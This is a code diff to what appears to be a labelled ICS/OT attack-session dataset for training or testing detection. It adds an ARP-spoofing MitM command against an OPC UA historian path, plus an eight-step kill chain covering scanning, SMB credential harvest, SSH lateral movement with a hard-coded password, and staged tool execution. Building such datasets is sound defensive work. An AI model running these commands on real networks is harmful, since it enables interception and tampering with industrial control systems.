@@ -108,6 +108,17 @@ def staged_tool_cmd() -> str:
     return "sshpass -p 'Cisco' ssh john@192.168.1.5 \"powershell -NoProfile -Command \\\"& py -3.11 C:\\\\Users\\\\john\\\\AppData\\\\Local\\\\Microsoft\\\\Diagnosis\\\\Downloads\\\\telemetry_sync_cache.py --endpoint opc.tcp://192.168.1.11:4840 --cycles 2 --pause 0.2\\\"\""
 
 
+def arp_mitm_cmd() -> str:
+    # Poison historian (192.168.1.10) so it resolves OPC-UA IP (192.168.1.11)
+    # to the attacker's MAC, intercepting the OPC UA path (T0830).
+    return (
+        "sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward; "
+        "arpspoof -i eth0 -t 192.168.1.10 192.168.1.11 & "
+        "arpspoof -i eth0 -t 192.168.1.11 192.168.1.10 & "
+        "sleep 8; kill $(jobs -p)'"
+    )
+
+
 SESSIONS = [
     {
         "id": "curated-benign-overview-a",
@@ -399,6 +410,29 @@ SESSIONS = [
             step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
             step("ews_staged_tool_execution", "impact", "process_anomaly", "ews", "T0831", "ews", "opcua", "process_launch", staged_tool_cmd()),
             step("opcua_critical_probe", "impact", "opcua_write", "opcua", "T0830", "monitoring_laptop", "opcua", "payload_send", critical_probe_cmd()),
+        ],
+    },
+    {
+        "id": "curated-attack-full-killchain-arp-a",
+        "family": "full_killchain_arp_mitm",
+        "ground_truth_label": "attack",
+        "session_intent": "ot_impact",
+        "session_danger_label": "critical",
+        "session_summary": (
+            "Complete 8-step ICS kill chain: network discovery, anonymous SMB credential "
+            "harvest, EWS lateral movement, host reconnaissance, historian data collection, "
+            "OPC UA path probing, staged tool execution, and ARP-poisoning MitM on the "
+            "OPC UA historian-to-server path (T0830)."
+        ),
+        "steps": [
+            step("level3_service_scan",       "discovery",         "discovery",      "network",   "T0846", "monitoring_laptop", "level3_network", "network_scan",   scan_cmd(),                                  2.0),
+            step("anonymous_smb_browse",      "credential_access", "smb_access",     "smb",       "T0811", "monitoring_laptop", "smb",            "smb_read",       smb_browse_cmd()),
+            step("ews_ssh_access",            "lateral_movement",  "host_activity",  "ews",       "T0866", "monitoring_laptop", "ews",            "ssh_session",    ews_access_cmd()),
+            step("ews_recon_commands",        "recon",             "host_command",   "ews",       "T0842", "ews",              "ews",            "process_launch", ews_recon_cmd()),
+            step("ews_historian_collection",  "collection",        "historian_web",  "historian", "T0802", "ews",              "historian",      "http_request",   ews_historian_cmd("weld_cell_temperature_c")),
+            step("opcua_tcp_probe",           "recon",             "opcua_path",     "opcua",     "T0861", "monitoring_laptop", "opcua",          "tcp_probe",      opcua_probe_cmd()),
+            step("ews_staged_tool_execution", "impact",            "process_anomaly","ews",       "T0831", "ews",              "opcua",          "process_launch", staged_tool_cmd()),
+            step("opcua_arp_mitm",            "impact",            "opcua_write",    "opcua",     "T0830", "monitoring_laptop", "historian_opcua","arp_poison",     arp_mitm_cmd(),                              8.0),
         ],
     },
 ]
